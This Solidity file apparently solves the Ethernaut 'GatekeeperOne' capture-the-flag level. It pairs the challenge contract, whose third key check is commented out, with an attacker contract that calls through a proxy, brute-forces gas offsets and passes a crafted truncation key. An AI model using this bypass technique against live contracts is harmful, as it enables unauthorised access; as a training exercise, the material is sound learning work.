// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';


contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
     // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract gate{
    using SafeMath for uint256;
    bytes8 key = 0x1ca4b5Fc0000028b; //last 16 digits of your account
  
    GatekeeperOne  gkpOne;

 
    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }
    
    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, ) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); 
      if(result)
        {
        break;
      }
    }
  }
        
    
}